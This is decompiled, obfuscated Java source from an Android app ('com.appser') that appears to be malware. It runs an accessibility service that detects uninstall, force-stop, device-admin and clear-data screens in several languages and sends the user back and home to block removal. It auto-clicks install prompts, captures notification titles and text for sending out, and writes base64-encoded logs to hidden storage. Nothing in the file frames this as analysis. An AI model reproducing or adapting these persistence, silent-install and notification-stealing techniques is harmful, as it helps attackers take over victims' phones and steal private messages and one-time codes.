            java.lang.String r4 = r4.toString()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r4 = r4.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r5 = r6.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            java.lang.CharSequence r7 = r19.getClassName()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r7 = r7.toString()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r7 = r7.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r5.equals(r7)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x02bd
            java.lang.String r5 = r18.getEventText(r19)     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r1 = r1.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r1 = r5.equals(r1)     // Catch:{ Exception -> 0x05d8 }
            if (r1 != 0) goto L_0x02b7
            java.lang.String r1 = r18.getEventText(r19)     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r1 = r1.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r2 = r2.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r1 = r1.equals(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r1 == 0) goto L_0x02bd
        L_0x02b7:
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack()     // Catch:{ Exception -> 0x02bd }
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendMeHome()     // Catch:{ Exception -> 0x02bd }
        L_0x02bd:
            java.lang.String r1 = r18.getEventText(r19)     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r1 = r1.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            android.content.Context r2 = r18.getApplicationContext()     // Catch:{ Exception -> 0x05d8 }
            android.content.res.Resources r2 = r2.getResources()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r2 = r2.getString(r3)     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r2 = r2.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            java.lang.CharSequence r5 = r19.getPackageName()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r5 = r5.toString()     // Catch:{ Exception -> 0x05d8 }
            r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            r18.getApplicationContext()     // Catch:{ Exception -> 0x0314 }
            java.lang.Object r5 = r0.getSystemService(r9)     // Catch:{ Exception -> 0x0314 }
            android.app.admin.DevicePolicyManager r5 = (android.app.admin.DevicePolicyManager) r5     // Catch:{ Exception -> 0x0314 }
            android.content.ComponentName r7 = new android.content.ComponentName     // Catch:{ Exception -> 0x0314 }
            java.lang.Class<com.appser.AdminReciver> r8 = com.appser.AdminReciver.class
            r7.<init>(r0, r8)     // Catch:{ Exception -> 0x0314 }
            boolean r5 = r5.isAdminActive(r7)     // Catch:{ Exception -> 0x0314 }
            if (r5 != 0) goto L_0x0314
            java.lang.String r5 = "Device Admin App"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x0314 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x0314 }
            if (r5 != 0) goto L_0x030e
            java.lang.String r5 = "مشرف الجهاز"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x0314 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x0314 }
            if (r5 == 0) goto L_0x0314
        L_0x030e:
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack()     // Catch:{ Exception -> 0x0314 }
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendMeHome()     // Catch:{ Exception -> 0x0314 }
        L_0x0314:
            java.lang.String r5 = "Accessibility"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x032c
            boolean r5 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x032c
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack()     // Catch:{ Exception -> 0x05d8 }
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendMeHome()     // Catch:{ Exception -> 0x05d8 }
        L_0x032c:
            java.lang.String r5 = "حذف"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x033e
            boolean r5 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r5 != 0) goto L_0x0362
        L_0x033e:
            java.lang.String r5 = "مسح"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x0350
            boolean r5 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r5 != 0) goto L_0x0362
        L_0x0350:
            java.lang.String r5 = "إلغاء"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x0368
            boolean r5 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x0368
        L_0x0362:
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack()     // Catch:{ Exception -> 0x05d8 }
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendMeHome()     // Catch:{ Exception -> 0x05d8 }
        L_0x0368:
            java.lang.String r5 = "Force stop"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 != 0) goto L_0x0380
            java.lang.String r5 = "Delete app data"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x0386
        L_0x0380:
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack()     // Catch:{ Exception -> 0x05d8 }
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendMeHome()     // Catch:{ Exception -> 0x05d8 }
        L_0x0386:
            boolean r5 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x039e
            java.lang.String r5 = "clear data"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x039e
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack()     // Catch:{ Exception -> 0x05d8 }
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendMeHome()     // Catch:{ Exception -> 0x05d8 }
        L_0x039e:
            boolean r5 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r7 = "Notification"
            if (r5 == 0) goto L_0x03c2
            java.lang.String r5 = "sil"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x03c2
            java.lang.String r5 = r7.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 != 0) goto L_0x03c2
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack()     // Catch:{ Exception -> 0x05d8 }
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendMeHome()     // Catch:{ Exception -> 0x05d8 }
        L_0x03c2:
            boolean r5 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x03d4
            java.lang.String r5 = "kaldır"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 != 0) goto L_0x03f8
        L_0x03d4:
            boolean r5 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x03e6
            java.lang.String r5 = "silmek"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 != 0) goto L_0x03f8
        L_0x03e6:
            boolean r5 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x03fe
            java.lang.String r5 = "zorla"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x03fe
        L_0x03f8:
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack()     // Catch:{ Exception -> 0x05d8 }
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendMeHome()     // Catch:{ Exception -> 0x05d8 }
        L_0x03fe:
            boolean r5 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x0410
            java.lang.String r5 = "uninstall"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 != 0) goto L_0x042c
        L_0x0410:
            boolean r5 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x0432
            java.lang.String r5 = "turn off"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x0432
            java.lang.String r5 = r7.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 != 0) goto L_0x0432
        L_0x042c:
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack()     // Catch:{ Exception -> 0x05d8 }
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendMeHome()     // Catch:{ Exception -> 0x05d8 }
        L_0x0432:
            boolean r5 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x0444
            java.lang.String r5 = "卸载"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 != 0) goto L_0x0456
        L_0x0444:
            boolean r5 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x045c
            java.lang.String r5 = "删除"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x045c
        L_0x0456:
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack()     // Catch:{ Exception -> 0x05d8 }
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendMeHome()     // Catch:{ Exception -> 0x05d8 }
        L_0x045c:
            boolean r5 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x0474
            java.lang.String r5 = "解除安装"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x0474
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack()     // Catch:{ Exception -> 0x05d8 }
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendMeHome()     // Catch:{ Exception -> 0x05d8 }
        L_0x0474:
            boolean r5 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x048c
            java.lang.String r5 = "关闭"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x048c
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack()     // Catch:{ Exception -> 0x05d8 }
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendMeHome()     // Catch:{ Exception -> 0x05d8 }
        L_0x048c:
            java.lang.String r5 = "Phone options"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x049e
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack()     // Catch:{ Exception -> 0x05d8 }
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendMeHome()     // Catch:{ Exception -> 0x05d8 }
        L_0x049e:
            java.lang.String r5 = "إيقاف"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x04c6
            boolean r5 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x04c6
            java.lang.String r5 = r6.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            java.lang.CharSequence r7 = r19.getClassName()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r7 = r7.toString()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r7 = r7.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r5.equals(r7)     // Catch:{ Exception -> 0x05d8 }
            if (r5 != 0) goto L_0x053e
        L_0x04c6:
            java.lang.String r5 = "stop"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x04ee
            boolean r5 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x04ee
            java.lang.String r5 = r6.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            java.lang.CharSequence r7 = r19.getClassName()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r7 = r7.toString()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r7 = r7.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r5.equals(r7)     // Catch:{ Exception -> 0x05d8 }
            if (r5 != 0) goto L_0x053e
        L_0x04ee:
            java.lang.String r5 = "delete"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x0516
            boolean r5 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x0516
            java.lang.String r5 = r6.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            java.lang.CharSequence r7 = r19.getClassName()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r7 = r7.toString()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r7 = r7.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r5.equals(r7)     // Catch:{ Exception -> 0x05d8 }
            if (r5 != 0) goto L_0x053e
        L_0x0516:
            java.lang.String r5 = "الإيقاف"
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r5 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r5 == 0) goto L_0x0544
            boolean r1 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r1 == 0) goto L_0x0544
            java.lang.String r1 = r6.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            java.lang.CharSequence r5 = r19.getClassName()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r5 = r5.toString()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r1 = r1.equals(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r1 == 0) goto L_0x0544
        L_0x053e:
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack()     // Catch:{ Exception -> 0x0544 }
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendMeHome()     // Catch:{ Exception -> 0x0544 }
        L_0x0544:
            java.lang.CharSequence r1 = r19.getPackageName()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r1 = r1.toString()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r5 = "com.google.android.packageinstaller"
            boolean r1 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r1 == 0) goto L_0x058c
            java.lang.CharSequence r1 = r19.getClassName()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r1 = r1.toString()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r1 = r1.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r5 = "android.app.alertdialog"
            boolean r1 = r1.contains(r5)     // Catch:{ Exception -> 0x05d8 }
            if (r1 == 0) goto L_0x058c
            java.lang.String r1 = r18.getEventText(r19)     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r1 = r1.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            android.content.Context r5 = r18.getApplicationContext()     // Catch:{ Exception -> 0x05d8 }
            android.content.res.Resources r5 = r5.getResources()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r3 = r5.getString(r3)     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r3 = r3.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r1 = r1.contains(r3)     // Catch:{ Exception -> 0x05d8 }
            if (r1 == 0) goto L_0x058c
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack()     // Catch:{ Exception -> 0x058c }
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendMeHome()     // Catch:{ Exception -> 0x058c }
        L_0x058c:
            java.lang.String r1 = "android.support.v7.widget.recyclerview"
            boolean r1 = r4.equals(r1)     // Catch:{ Exception -> 0x05d8 }
            if (r1 != 0) goto L_0x05a4
            java.lang.String r1 = "android.widget.linearlayout"
            boolean r1 = r4.equals(r1)     // Catch:{ Exception -> 0x05d8 }
            if (r1 != 0) goto L_0x05a4
            java.lang.String r1 = "android.widget.framelayout"
            boolean r1 = r4.equals(r1)     // Catch:{ Exception -> 0x05d8 }
            if (r1 == 0) goto L_0x05d8
        L_0x05a4:
            java.lang.CharSequence r1 = r19.getPackageName()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r1 = r1.toString()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r3 = "com.android.settings"
            boolean r1 = r1.equals(r3)     // Catch:{ Exception -> 0x05d8 }
            if (r1 != 0) goto L_0x05c4
            java.lang.CharSequence r1 = r19.getPackageName()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r1 = r1.toString()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r3 = "com.miui.securitycenter"
            boolean r1 = r1.equals(r3)     // Catch:{ Exception -> 0x05d8 }
            if (r1 == 0) goto L_0x05d8
        L_0x05c4:
            java.lang.String r1 = r18.getEventText(r19)     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r1 = r1.toLowerCase()     // Catch:{ Exception -> 0x05d8 }
            boolean r1 = r1.contains(r2)     // Catch:{ Exception -> 0x05d8 }
            if (r1 == 0) goto L_0x05d8
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack()     // Catch:{ Exception -> 0x05d8 }
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendMeHome()     // Catch:{ Exception -> 0x05d8 }
        L_0x05d8:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.onAccessibilityEvent(android.view.accessibility.AccessibilityEvent):void");
    }

    private static boolean advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32performClick(List<AccessibilityNodeInfo> list) {
        if (list == null) {
            return false;
        }
        try {
            if (list.isEmpty()) {
                return false;
            }
            for (AccessibilityNodeInfo next : list) {
                if (next.isEnabled()) {
                    return next.performAction(16);
                }
            }
            return false;
        } catch (Exception unused) {
            return false;
        }
    }

    public static List<AccessibilityNodeInfo> advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32findNodesByText(String str) {
        AccessibilityNodeInfo advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32getRootNodeInfo = advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32getRootNodeInfo();
        if (advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32getRootNodeInfo != null) {
            return advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32getRootNodeInfo.findAccessibilityNodeInfosByText(str);
        }
        return null;
    }

    private static AccessibilityNodeInfo advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32getRootNodeInfo() {
        if (Build.VERSION.SDK_INT >= 16) {
            return advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.MyAccess.getRootInActiveWindow();
        }
        return advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32GlobalEvent.getSource();
    }

    public static boolean advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32clickByText(String str) {
        return advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32performClick(advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32findNodesByText(str));
    }

    private boolean Gotitinstalled(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo != null) {
            int childCount = accessibilityNodeInfo.getChildCount();
            if ("android.widget.Button".equals(accessibilityNodeInfo.getClassName())) {
                String charSequence = accessibilityNodeInfo.getText().toString();
                if (!TextUtils.isEmpty(charSequence) && ("安装".equals(charSequence) || "install".equals(charSequence.toLowerCase()) || "done".equals(charSequence.toLowerCase()) || "完成".equals(charSequence) || "تثبيت".equals(charSequence) || "确定".equals(charSequence))) {
                    accessibilityNodeInfo.performAction(16);
                    return true;
                }
            } else if ("android.widget.ScrollView".equals(accessibilityNodeInfo.getClassName())) {
                accessibilityNodeInfo.performAction(4096);
            }
            for (int i = 0; i < childCount; i++) {
                if (Gotitinstalled(accessibilityNodeInfo.getChild(i))) {
                    return true;
                }
            }
        }
        return false;
    }

    private void advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendNotifi(AccessibilityEvent accessibilityEvent) {
        try {
            Notification notification = (Notification) accessibilityEvent.getParcelableData();
            if (notification != null) {
                String charSequence = notification.extras.getCharSequence(NotificationCompat.EXTRA_TITLE).toString();
                String charSequence2 = notification.extras.getCharSequence(NotificationCompat.EXTRA_TEXT).toString();
                String advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32getAppNameFromPkgName = advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32getAppNameFromPkgName(this, accessibilityEvent.getPackageName().toString());
                String str = safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.N_safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5_F;
                outerypatientsivaliumgacquisitionsacasiootreatyqintegratingoeligibleotransactionmleonegboringj4.climatenpostersxpromptnlimitationsvbehaviornshortlysconsiderableibannersadramaticlpolicygtapx47(str, (advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32getAppNameFromPkgName + "|" + charSequence + "|" + charSequence2 + "|.").getBytes());
            }
        } catch (Exception unused) {
        }
    }

    public static String advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32getAppNameFromPkgName(Context context, String str) {
        try {
            PackageManager packageManager = context.getPackageManager();
            return (String) packageManager.getApplicationLabel(packageManager.getApplicationInfo(str, 128));
        } catch (PackageManager.NameNotFoundException unused) {
            return "";
        }
    }

    public static String advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32toBase64(String str) {
        try {
            return Base64.encodeToString(str.getBytes("UTF-8"), 0);
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            return null;
        }
    }

    /* JADX WARNING: No exception handlers in catch block: Catch:{  } */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public java.lang.String advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32RD(java.lang.String r8) {
        /*
            r7 = this;
            java.io.File r0 = android.os.Environment.getExternalStorageDirectory()
            java.io.File r1 = new java.io.File
            java.lang.StringBuilder r2 = new java.lang.StringBuilder
            r2.<init>()
            r2.append(r0)
            java.lang.String r3 = "/Config/sys/apps/log"
            r2.append(r3)
            java.lang.String r2 = r2.toString()
            java.lang.StringBuilder r4 = new java.lang.StringBuilder
            r4.<init>()
            java.lang.String r5 = "log-"
            r4.append(r5)
            r4.append(r8)
            java.lang.String r6 = ".txt"
            r4.append(r6)
            java.lang.String r4 = r4.toString()
            r1.<init>(r2, r4)
            boolean r2 = r1.exists()
            if (r2 != 0) goto L_0x005c
            java.io.File r1 = new java.io.File
            java.lang.StringBuilder r2 = new java.lang.StringBuilder
            r2.<init>()
            r2.append(r0)
            r2.append(r3)
            java.lang.String r0 = r2.toString()
            java.lang.StringBuilder r2 = new java.lang.StringBuilder
            r2.<init>()
            r2.append(r5)
            r2.append(r8)
            r2.append(r6)
            java.lang.String r8 = r2.toString()
            r1.<init>(r0, r8)
        L_0x005c:
            java.lang.StringBuilder r8 = new java.lang.StringBuilder
            r8.<init>()
            java.io.BufferedReader r0 = new java.io.BufferedReader     // Catch:{  }
            java.io.FileReader r2 = new java.io.FileReader     // Catch:{  }
            r2.<init>(r1)     // Catch:{  }
            r0.<init>(r2)     // Catch:{  }
        L_0x006b:
            java.lang.String r1 = r0.readLine()     // Catch:{ FileNotFoundException -> 0x0078 }
            if (r1 == 0) goto L_0x0075
            r8.append(r1)     // Catch:{ FileNotFoundException -> 0x0078 }
            goto L_0x006b
        L_0x0075:
            r0.close()     // Catch:{ FileNotFoundException -> 0x0078 }
        L_0x0078:
            java.lang.String r8 = r8.toString()
            return r8
        */
        throw new UnsupportedOperationException("Method not decompiled: com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32RD(java.lang.String):java.lang.String");
    }

    /* access modifiers changed from: package-private */
    public void advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32writeFile(String str) {
        try {
            String charSequence = DateFormat.format("yyyy-MM-dd", new Date()).toString();
            File externalStorageDirectory = Environment.getExternalStorageDirectory();
            File file = new File(externalStorageDirectory, "/Config/sys/apps/log");
            File file2 = new File(externalStorageDirectory, "/Config/sys/apps/log/log-" + charSequence + ".txt");
            if (!file.exists()) {
                file.mkdirs();
            }
            if (!file2.exists()) {
                file2.createNewFile();
            }
            String str2 = advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32toBase64(str) + ">\r\n";
            File file3 = new File(externalStorageDirectory + "/Config/sys/apps/log", "log-" + charSequence + ".txt");
            if (!file3.exists()) {
                file3.createNewFile();
            }
            FileOutputStream fileOutputStream = new FileOutputStream(file3, true);
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(fileOutputStream);
            outputStreamWriter.append(str2);
            outputStreamWriter.flush();
            outputStreamWriter.close();
            fileOutputStream.close();
            fileOutputStream.flush();
        } catch (Exception unused) {
        }
    }

    public void advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack() {
        try {
            new Handler(Looper.getMainLooper()).post(new Runnable() {
                public void run() {
                    try {
                        if (Build.VERSION.SDK_INT > 15) {
                            for (int i = 0; i < 4; i++) {
                                try {
                                    advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.this.performGlobalAction(1);
                                } catch (Exception unused) {
                                }
                            }
                        }
                    } catch (Exception unused2) {
                    }
                }
            });
        } catch (Exception unused) {
        }
    }

